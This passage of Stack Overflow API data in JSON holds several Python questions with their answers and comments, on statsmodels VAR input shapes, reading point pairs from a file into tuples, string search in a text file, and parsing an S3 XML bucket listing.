another Statsmodels method that behaves similarly to VAR or VARMAX and enables you to use exogenous variable as well? (and still accept 1d inputs as you mentioned in the answer)"}], "tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": false, "score": 3, "last_activity_date": 1463017439, "creation_date": 1463017439, "answer_id": 37175906, "question_id": 37174514, "link": "https://stackoverflow.com/questions/37174514/python-statsmodels-vector-autoregression-endog/37175906#37175906", "title": "Python/Statsmodels - Vector autoregression endog", "body": "<p>The <code>statsmodels.tsa.api.VAR</code> model is meant for multivariate time series as illustrated <a href=\"http://statsmodels.sourceforge.net/devel/vector_ar.html\" rel=\"nofollow\">here</a>. So the input needs to be at least <code>.shape=(T, 2)</code>.</p>\n\n<p>There are various other methods for univariate time series analysis avaiable (<a href=\"http://statsmodels.sourceforge.net/devel/tsa.html#univariate-autogressive-processes-ar\" rel=\"nofollow\">see docs)</a>. These accept 1d inputs (or <code>.shape=(T, 1)</code>).</p>\n"}], "owner": {"reputation": 3583, "user_id": 5606352, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b334268d7a7805d0d4d4e406c79bbc2a?s=128&d=identicon&r=PG&f=1", "display_name": "abutremutante", "link": "https://stackoverflow.com/users/5606352/abutremutante"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3267, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1466519004, "creation_date": 1463006921, "last_edit_date": 1466519004, "question_id": 37174514, "link": "https://stackoverflow.com/questions/37174514/python-statsmodels-vector-autoregression-endog", "title": "Python/Statsmodels - Vector autoregression endog", "body": "<p>I'm trying to run a VAR using <code>statsmodels</code> library and apparently my endog format is wrong. Tried a few different things but I can't find out how to solve it.</p>\n\n<p>I'm running the following code:</p>\n\n<pre><code>def VAR_run(pred_frame,targetframe):\n\n    #preparing the dates\n    dates=pred_frame.index\n\n    # preparing target\n    targetmatrix=targetframe.as_matrix()\n\n    # preparing pred_frame\n    predmatrix=pred_frame.as_matrix()\n\n    #creating endog\n    timeseries=(predmatrix,targetmatrix)\n\n    model=VAR((timeseries),dates=dates)\n</code></pre>\n\n<p>The error I'm getting is the following:</p>\n\n<pre><code>File \"/Users/file.py\", line 1198, in M_pred_frame\nVAR_run(pred_frame,targetframe)\nFile \"/file.py\", line 1156, in VAR_run\nmodel=VAR((timeseries),dates=dates)\nFile \"/Library/Python/2.7/site-packages/statsmodels/tsa/vector_ar/var_model.py\", line 334, in __init__\nraise ValueError(\"Only gave one variable to VAR\")\nValueError: Only gave one variable to VAR\n</code></pre>\n\n<p>Can anyone enlighten my journey?</p>\n\n<hr>\n\n<p><strong>EXTRA INFO</strong></p>\n\n<p><code>pred_frame</code> is originally a pandas <code>DataFrame</code> like this:</p>\n\n<pre><code>            Value  lag1  2lag  3lag  4lag  5lag  6lag  7lag  8lag  9lag\nDate                                                                      \n...\n2015-12-01   1.01  0.82  0.54  0.22  0.62  0.79  0.74  0.71  1.32  1.22   \n2016-01-01   0.96  1.01  0.82  0.54  0.22  0.62  0.79  0.74  0.71  1.32   \n2016-02-01   1.27  0.96  1.01  0.82  0.54  0.22  0.62  0.79  0.74  0.71  \n</code></pre>\n\n<p><code>targetframe</code> is also originally a pandas <code>DataFrame</code> like this:</p>\n\n<pre><code>            Tgt\nDate            \n...\n2015-10-01  0.54\n2015-11-01  0.82\n2015-12-01  1.01\n2016-01-01  0.96\n2016-02-01  1.27\n</code></pre>\n\n<p>When turned into arrays they look like this:</p>\n\n<pre><code>targetmatrix = [[  nan]\n                [ 1.18]\n                [ 0.5 ]\n                [ 0.51]\n                ...]\n\npredmatrix= ...[  1.27         0.96         1.01       ...,  -2.14865885  -2.14865885\n            -3.19355784]\n            [         nan          nan          nan ..., -18.13211803  -2.14865885\n            -2.14865885]\n            [         nan          nan          nan ...,          nan          nan\n            nan]]\n\n\ndates = DatetimeIndex(['1958-04-01', '1958-05-01', '1958-06-01', '1958-07-01',\n                       '1958-08-01', '1958-09-01', '1958-10-01', '1958-11-01',\n                       '1958-12-01', '1959-01-01',\n                       ...\n                       '2015-07-01', '2015-08-01', '2015-09-01', '2015-10-01',\n                       '2015-11-01', '2015-12-01', '2016-01-01', '2016-02-01',\n                       '2016-03-01', '2016-04-01'],\n                       dtype='datetime64[ns]', name=u'Date', length=697, freq='MS')\n</code></pre>\n\n<p>About the shapes:</p>\n\n<pre><code>targetmatrix.shape = (230, 1)\npredmatrix.shape = (697, 1920)\ndates.shape=(697,)\n</code></pre>\n\n<p>Your help will be highly appreciated :)</p>\n"}, {"tags": ["python", "list", "file", "for-loop", "tuples"], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 6317491, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d566fb94d9cac6b38ebd6a88db353733?s=128&d=identicon&r=PG&f=1", "display_name": "saleem", "link": "https://stackoverflow.com/users/6317491/saleem"}, "edited": false, "score": 0, "creation_date": 1463008267, "post_id": 37174538, "comment_id": 61884066, "body": "Cheers for the fast reply. I think Im going to implement the .split() function you have at the top there"}, {"owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "reply_to_user": {"reputation": 43, "user_id": 6317491, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d566fb94d9cac6b38ebd6a88db353733?s=128&d=identicon&r=PG&f=1", "display_name": "saleem", "link": "https://stackoverflow.com/users/6317491/saleem"}, "edited": false, "score": 0, "creation_date": 1463008381, "post_id": 37174538, "comment_id": 61884106, "body": "No worries, a file object returns its own iterator, once you call next on it you move to the second line so there is no need to do anything else bar split and cast to tuple, if you are ok with lists just split"}], "tags": [], "owner": {"reputation": 159774, "user_id": 2141635, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/f6yNV.jpg?s=128&g=1", "display_name": "Padraic Cunningham", "link": "https://stackoverflow.com/users/2141635/padraic-cunningham"}, "is_accepted": false, "score": 2, "last_activity_date": 1463008204, "last_edit_date": 1463008204, "creation_date": 1463007040, "answer_id": 37174538, "question_id": 37174497, "link": "https://stackoverflow.com/questions/37174497/writing-a-file-to-a-list-of-tuples/37174538#37174538", "title": "writing a file to a list of tuples", "body": "<p>You can call <em>next</em> on the file object to skip the first line and start at the second then either split each line and call tuple or let the <em>csv.reader</em> parse each row and map to tuple:</p>\n\n<p>splitting:</p>\n\n<pre><code>with open(\"in.txt\") as f:\n    next(f) # skip first line\n    arr = [tuple(line.split()) for line in f]\n    print(arr)\n</code></pre>\n\n<p>csv lib:</p>\n\n<pre><code>import  csv\nwith open(\"in.txt\") as f:\n    next(f) # skip first line\n    arr = list(map(tuple, csv.reader(f,delimiter=\" \")))\n    print(arr)\n</code></pre>\n\n<p>Both will return:</p>\n\n<pre><code>[('96', '571'), ('45', '734'), ('174', '416'), ('357', '259'), ('88', '97'), ('188', '495'), ('348', '443'), ('301', '503'), ('719', '177'), ('182', '237')]\n</code></pre>\n\n<p>If you want ints:</p>\n\n<pre><code>with open(\"in.txt\") as f:\n    next(f) # skip first line\n    arr = [tuple(map(int, line.split())) for line in f]\n    print(arr)\n</code></pre>\n\n<p>And the csv.reader:</p>\n\n<pre><code>import  csv\nwith open(\"in.txt\") as f:\n    next(f) # skip first line\n    arr = [tuple(map(int,row) for row in  csv.reader(f,delimiter=\" \"))]\n    print(arr)\n</code></pre>\n\n<p>Which will give you:</p>\n\n<pre><code> [(96, 571), (45, 734), (174, 416), (357, 259), (88, 97), (188, 495), (348, 443), (301, 503), (719, 177), (182, 237\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 43, "user_id": 6317491, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d566fb94d9cac6b38ebd6a88db353733?s=128&d=identicon&r=PG&f=1", "display_name": "saleem", "link": "https://stackoverflow.com/users/6317491/saleem"}, "edited": false, "score": 0, "creation_date": 1463007844, "post_id": 37174551, "comment_id": 61883947, "body": "Thank you that is fantastic. I didn&#39;t even think to use .split()  cheers"}], "tags": [], "owner": {"reputation": 40575, "user_id": 793428, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/999b32fdf6b04835061fffd1c5c6cf76?s=128&d=identicon&r=PG&f=1", "display_name": "ozgur", "link": "https://stackoverflow.com/users/793428/ozgur"}, "is_accepted": true, "score": 2, "last_activity_date": 1463007991, "last_edit_date": 1463007991, "creation_date": 1463007103, "answer_id": 37174551, "question_id": 37174497, "link": "https://stackoverflow.com/questions/37174497/writing-a-file-to-a-list-of-tuples/37174551#37174551", "title": "writing a file to a list of tuples", "body": "<p>You can use <code>.split()</code> to create the tuple out of each line and check the length:</p>\n\n<pre><code>def readDataPts(filename):\n    listPts = []\n    with open(filename, 'r') as f:\n        for line in f:\n            numbers = line.split()\n            if len(numbers) == 2:\n                listPts.append(map(int, numbers))\n    return listPts\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 43, "user_id": 6317491, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d566fb94d9cac6b38ebd6a88db353733?s=128&d=identicon&r=PG&f=1", "display_name": "saleem", "link": "https://stackoverflow.com/users/6317491/saleem"}, "edited": false, "score": 1, "creation_date": 1463008321, "post_id": 37174560, "comment_id": 61884084, "body": "Thank you for the reply. I never knew you could give indices to a for loop like that."}], "tags": [], "owner": {"reputation": 481, "user_id": 5605721, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uFfUb.jpg?s=128&g=1", "display_name": "superbeck", "link": "https://stackoverflow.com/users/5605721/superbeck"}, "is_accepted": false, "score": 0, "last_activity_date": 1463007139, "creation_date": 1463007139, "answer_id": 37174560, "question_id": 37174497, "link": "https://stackoverflow.com/questions/37174497/writing-a-file-to-a-list-of-tuples/37174560#37174560", "title": "writing a file to a list of tuples", "body": "<p>You can use tell the loop to only iterate over lines[1:] which will skip the first line and use all the rest.</p>\n\n<pre><code>def readDataPts(filename):\n\"\"\"Reads data from an input file and returns a list of tuples\n   [(x0,y0), (x1, y1), ...]\n\"\"\"\n\n    file = open(filename, 'r')\n    lines = file.readlines()\n    listPts = []\n    for line in lines[1:]:\n        for ptx, pty in line:\n            x = (ptx, pty)\n        listPts.append(x)\n    return listPts\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "is_accepted": false, "score": 0, "last_activity_date": 1463012161, "creation_date": 1463012161, "answer_id": 37175249, "question_id": 37174497, "link": "https://stackoverflow.com/questions/37174497/writing-a-file-to-a-list-of-tuples/37175249#37175249", "title": "writing a file to a list of tuples", "body": "<p>Just another idea.</p>\n\n<pre><code>with open('in.txt') as f:\n    nums = map(int, f.read().split())\n    print zip(nums[1::2], nums[2::2])\n</code></pre>\n"}], "owner": {"reputation": 43, "user_id": 6317491, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/d566fb94d9cac6b38ebd6a88db353733?s=128&d=identicon&r=PG&f=1", "display_name": "saleem", "link": "https://stackoverflow.com/users/6317491/saleem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 229, "favorite_count": 0, "accepted_answer_id": 37174551, "answer_count": 4, "score": 2, "last_activity_date": 1463016751, "creation_date": 1463006824, "last_edit_date": 1463016751, "question_id": 37174497, "link": "https://stackoverflow.com/questions/37174497/writing-a-file-to-a-list-of-tuples", "title": "writing a file to a list of tuples", "body": "<p>I am trying to read a file and write its contents to a list of tuples. the length of each tuple is 2 and the length of the list is variable depending on which file we read from. Each tuple should represent a point in the x, y plane with the first value being the x coord and the second the y. The issue I am having is that I believe a for loop is the best way to do this but the first line in the file is a single value representing how many points are in the file and should not be included in the final list at all.</p>\n\n<pre><code>def readDataPts(filename):\n    \"\"\"Reads data from an input file and returns a list of tuples\n       [(x0,y0), (x1, y1), ...]\n    \"\"\"\n    file = open(filename, 'r')\n    lines = file.readlines()\n    listPts = []\n    for line in lines:\n        for ptx, pty in line:\n            x = (ptx, pty)\n        listPts.append(x)\n    return listPts\n</code></pre>\n\n<p>An example of an input is:</p>\n\n<p>10<br/>\n96 571<br/>\n45 734<br/>\n174 416<br/>\n357 259<br/>\n88 97<br/>\n188 495<br/>\n348 443<br/>\n301 503<br/>\n719 177<br/>\n182 237</p>\n\n<p>and the output should be:</p>\n\n<pre><code>[(96, 571), (45, 734), (174, 416), (357, 259), (88, 97).....]\n</code></pre>\n\n<p>Is there a way to start the for loop from the second line? or is there an easier way to solve this?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["python"], "comments": [{"owner": {"reputation": 3567, "user_id": 4116239, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ksElS.png?s=128&g=1", "display_name": "Kevin J. Chase", "link": "https://stackoverflow.com/users/4116239/kevin-j-chase"}, "edited": false, "score": 2, "creation_date": 1463006654, "post_id": 37174466, "comment_id": 61883594, "body": "<code>good</code> is not a string; <code>&#39;good&#39;</code> is."}], "answers": [{"comments": [{"owner": {"reputation": 165, "user_id": 6054311, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/6f4da23e513a8877020bd55c84081be4?s=128&d=identicon&r=PG&f=1", "display_name": "Codelife", "link": "https://stackoverflow.com/users/6054311/codelife"}, "edited": false, "score": 0, "creation_date": 1463006774, "post_id": 37174488, "comment_id": 61883638, "body": "yes, got it. Thanks."}, {"owner": {"reputation": 165, "user_id": 6054311, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/6f4da23e513a8877020bd55c84081be4?s=128&d=identicon&r=PG&f=1", "display_name": "Codelife", "link": "https://stackoverflow.com/users/6054311/codelife"}, "edited": false, "score": 0, "creation_date": 1463007093, "post_id": 37174488, "comment_id": 61883733, "body": "Also, need one more help. If I want to print that line which contain that word then what should I do?"}, {"owner": {"reputation": 165, "user_id": 6054311, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/6f4da23e513a8877020bd55c84081be4?s=128&d=identicon&r=PG&f=1", "display_name": "Codelife", "link": "https://stackoverflow.com/users/6054311/codelife"}, "edited": false, "score": 0, "creation_date": 1463007384, "post_id": 37174488, "comment_id": 61883820, "body": "did it. Thanks. Approving your answer."}, {"owner": {"reputation": 481, "user_id": 5605721, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uFfUb.jpg?s=128&g=1", "display_name": "superbeck", "link": "https://stackoverflow.com/users/5605721/superbeck"}, "reply_to_user": {"reputation": 165, "user_id": 6054311, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/6f4da23e513a8877020bd55c84081be4?s=128&d=identicon&r=PG&f=1", "display_name": "Codelife", "link": "https://stackoverflow.com/users/6054311/codelife"}, "edited": false, "score": 0, "creation_date": 1463007485, "post_id": 37174488, "comment_id": 61883845, "body": "Thanks for the approval!"}], "tags": [], "owner": {"reputation": 481, "user_id": 5605721, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uFfUb.jpg?s=128&g=1", "display_name": "superbeck", "link": "https://stackoverflow.com/users/5605721/superbeck"}, "is_accepted": false, "score": 3, "last_activity_date": 1463007448, "last_edit_date": 1463007448, "creation_date": 1463006740, "answer_id": 37174488, "question_id": 37174466, "link": "https://stackoverflow.com/questions/37174466/search-string-in-text-file-name-not-defined-error-python3/37174488#37174488", "title": "Search string in text file : name not defined error python3", "body": "<p>Since you are looking for the string 'good', you need to surround it with quotes. Right now the program thinks you are trying to find something stored in the variable named good, and that variable does not exist.</p>\n\n<pre><code>if 'good' in line:\n</code></pre>\n\n<p>That should fix your problem.</p>\n\n<p>Edit in response to comment:\nYou can return the line where the string was found and add it to your print statement.</p>\n\n<pre><code>def check():\n        datafile = open('testfile.txt')\n        found = False\n        for line in datafile:\n            if 'good' in line:\n                found = True\n                break\n        return found, line\n\nfound, line = check()\nif found:\n    print (\"String found: \" + line)\nelse:\n    print (\"not found\")\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 9459, "user_id": 958051, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/KHi3g.png?s=128&g=1", "display_name": "Serdalis", "link": "https://stackoverflow.com/users/958051/serdalis"}, "is_accepted": true, "score": 0, "last_activity_date": 1463007022, "creation_date": 1463007022, "answer_id": 37174532, "question_id": 37174466, "link": "https://stackoverflow.com/questions/37174466/search-string-in-text-file-name-not-defined-error-python3/37174532#37174532", "title": "Search string in text file : name not defined error python3", "body": "<p>You have forgotten to put quotes around what you want to be a string.<br>\nChanging <code>good</code> to either <code>'good'</code> or <code>\"good\"</code> will fix your problem.</p>\n\n<p>There are some other problems with this code though, you are forgetting to close the file for one.<br>\nYour code should look more like:</p>\n\n<pre><code>def check():\n    with open('testfile.txt') as datafile:\n        found = False\n        for line in datafile:\n            if 'good' in line:\n                found = True\n                break\n    return found\n</code></pre>\n\n<p>If you edit python in an IDE ( such as <code>IDLE</code> ) you will notice mistakes like these easier because syntax highlighting will usually highlight the string, but not highlight variable names.</p>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 6317911, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fd0899cf26d37b54d7c92956caa85972?s=128&d=identicon&r=PG&f=1", "display_name": "Mosfetdaha", "link": "https://stackoverflow.com/users/6317911/mosfetdaha"}, "is_accepted": false, "score": 0, "last_activity_date": 1463013077, "last_edit_date": 1463013077, "creation_date": 1463009375, "answer_id": 37174884, "question_id": 37174466, "link": "https://stackoverflow.com/questions/37174466/search-string-in-text-file-name-not-defined-error-python3/37174884#37174884", "title": "Search string in text file : name not defined error python3", "body": "<p>You can use <code>x.find('my string')</code> object it checks a string and returns how many times the substring you are looking for is mentioned. if it doesnt exist it should return a 0. maybe this is a more pythonian way of doing this?? hope this helps =)</p>\n"}], "owner": {"reputation": 165, "user_id": 6054311, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/6f4da23e513a8877020bd55c84081be4?s=128&d=identicon&r=PG&f=1", "display_name": "Codelife", "link": "https://stackoverflow.com/users/6054311/codelife"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 863, "favorite_count": 0, "closed_date": 1464367705, "accepted_answer_id": 37174532, "answer_count": 3, "score": 0, "last_activity_date": 1463013077, "creation_date": 1463006534, "question_id": 37174466, "link": "https://stackoverflow.com/questions/37174466/search-string-in-text-file-name-not-defined-error-python3", "closed_reason": "Not suitable for this site", "title": "Search string in text file : name not defined error python3", "body": "<p>Hi I want to search a string in a text file using python. I am using python3.</p>\n\n<p>Here is my code :- </p>\n\n<pre><code>def check():\n        datafile = open('testfile.txt')\n        found = False\n        for line in datafile:\n            if good in line:\n                found = True\n                break\n\n        return found\n\nfound = check()\nif found:\n    print (\"String found\")\nelse:\n    print (\"not found\")\n</code></pre>\n\n<p>Here testfile.txt is a text file which contains the string \"good\". So, expected output should be \"String found\". But, it is showing error \"NameError: name 'good' is not defined'.</p>\n"}, {"tags": ["python", "xml", "amazon-s3"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463006304, "post_id": 37174413, "comment_id": 61883493, "body": "Post the code you tried and what went wrong and we will fix it."}, {"owner": {"reputation": 4600, "user_id": 4315866, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/8511f579eed33ee3f3be0581ac6233e9?s=128&d=identicon&r=PG", "display_name": "Petros Kyriakou", "link": "https://stackoverflow.com/users/4315866/petros-kyriakou"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463006556, "post_id": 37174413, "comment_id": 61883567, "body": "@AlexHall hey there, you can check what i tried above along with console output thanks"}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463006674, "post_id": 37174413, "comment_id": 61883604, "body": "That&#39;s a start, you got all the nodes. &quot;The problem is i want to find nodes in that structure that their Key starts with &quot;part-&quot;&quot; Where have you tried to filter out those nodes?"}, {"owner": {"reputation": 4600, "user_id": 4315866, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/8511f579eed33ee3f3be0581ac6233e9?s=128&d=identicon&r=PG", "display_name": "Petros Kyriakou", "link": "https://stackoverflow.com/users/4315866/petros-kyriakou"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463006732, "post_id": 37174413, "comment_id": 61883620, "body": "i tried <code>for child in root.iter(&#39;Contents&#39;):</code> but it returns back nothing which stops me from search those contents."}, {"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463007025, "post_id": 37174413, "comment_id": 61883711, "body": "Let&#39;s make a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>. Remove anything about S3 and urllib2 from the question because this is an XML parsing issue. Put some sample XML in a string literal directly in the code and use <code>fromstring</code>."}, {"owner": {"reputation": 4600, "user_id": 4315866, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/8511f579eed33ee3f3be0581ac6233e9?s=128&d=identicon&r=PG", "display_name": "Petros Kyriakou", "link": "https://stackoverflow.com/users/4315866/petros-kyriakou"}, "reply_to_user": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 0, "creation_date": 1463007503, "post_id": 37174413, "comment_id": 61883850, "body": "nvm i found what i was looking for cheers!"}], "answers": [{"tags": [], "owner": {"reputation": 4600, "user_id": 4315866, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/8511f579eed33ee3f3be0581ac6233e9?s=128&d=identicon&r=PG", "display_name": "Petros Kyriakou", "link": "https://stackoverflow.com/users/4315866/petros-kyriakou"}, "is_accepted": false, "score": 0, "last_activity_date": 1463007520, "creation_date": 1463007520, "answer_id": 37174631, "question_id": 37174413, "link": "https://stackoverflow.com/questions/37174413/how-to-search-for-certain-strings-within-an-xml-response/37174631#37174631", "title": "How to search for certain strings within an xml response", "body": "<p>my solution</p>\n\n<pre><code>f = urllib2.urlopen(\"https://s3.amazonaws.com/******\")\n\ntree = ET.parse(f)\nroot = tree.getroot()\n\nfor child in root.findall('{http://s3.amazonaws.com/doc/2006-03-01/}Contents'):\n    for key in child.findall(\"{http://s3.amazonaws.com/doc/2006-03-01/}Key\"):\n        print key.text\n</code></pre>\n"}], "owner": {"reputation": 4600, "user_id": 4315866, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/8511f579eed33ee3f3be0581ac6233e9?s=128&d=identicon&r=PG", "display_name": "Petros Kyriakou", "link": "https://stackoverflow.com/users/4315866/petros-kyriakou"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1463007520, "creation_date": 1463006214, "last_edit_date": 1463006537, "question_id": 37174413, "link": "https://stackoverflow.com/questions/37174413/how-to-search-for-certain-strings-within-an-xml-response", "title": "How to search for certain strings within an xml response", "body": "<p>I am using urllib2 library to get access to an s3 bucket i have. I get an xml structure back. The problem is i want to find nodes in that structure that their Key starts with \"part-\"</p>\n\n<p>i want to then extract and save those in a list/array whatever and loop through them afterwards to read the contents of those files</p>\n\n<p>part of xml response</p>\n\n<pre><code>&lt;Contents&gt;\n&lt;Key&gt;output/part-00000&lt;/Key&gt;\n&lt;LastModified&gt;2016-05-11T17:01:19.000Z&lt;/LastModified&gt;\n&lt;ETag&gt;\"d41d8cd98f00b204e9800998ecf8427e\"&lt;/ETag&gt;\n&lt;Size&gt;0&lt;/Size&gt;\n&lt;StorageClass&gt;STANDARD&lt;/StorageClass&gt;\n&lt;/Contents&gt;\n&lt;Contents&gt;\n&lt;Key&gt;output/part-00001&lt;/Key&gt;\n&lt;LastModified&gt;2016-05-11T17:01:15.000Z&lt;/LastModified&gt;\n&lt;ETag&gt;\"d41d8cd98f00b204e9800998ecf8427e\"&lt;/ETag&gt;\n&lt;Size&gt;0&lt;/Size&gt;\n&lt;StorageClass&gt;STANDARD&lt;/StorageClass&gt;\n&lt;/Contents&gt;\n</code></pre>\n\n<p>Right now i am doing the following</p>\n\n<pre><code>import xml.etree.ElementTree as ET\n\nf = urllib2.urlopen(\"https://s3.amazonaws.com/*******\")\n\ntree = ET.parse(f)\nroot = tree.getroot()\n\nfor child in root:\n    print child\n</code></pre>\n\n<p>output</p>\n\n<pre><code>&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Name' at 0x103a325d0&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Prefix' at 0x103a32610&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Marker' at 0x103a32690&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}MaxKeys' at 0x103a32710&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}IsTruncated' at 0x103a32750&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a32790&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a32950&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a32b10&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a32cd0&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a32e90&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e090&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e250&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e410&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e5d0&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e790&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3e950&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3eb10&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3ecd0&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a3ee90&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47090&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47250&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47410&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a475d0&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47790&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47950&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47b10&gt;\n&lt;Element '{http://s3.amazonaws.com/doc/2006-03-01/}Contents' at 0x103a47cd0&gt;\n</code></pre>\n\n<p>i have tried various solutions using minidom, and xml.etree.ElementTree but i do not quite get it right.</p>\n\n<p>So what i want is to loop through those xml nodes find all references of part-***** and save them in an array.</p>\n\n<p>any help/clues is/are welcomed</p>\n"}, {"tags": ["python", "pandas"], "answers": [{"tags": [], "owner": {"reputation": 34745, "user_id": 1494637, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/a50559f059e0621b4f543bcda9aad0a6?s=128&d=identicon&r=PG&f=1", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1494637/stefan"}, "is_accepted": false, "score": 0, "last_activity_date": 1463010403, "last_edit_date": 1463010403, 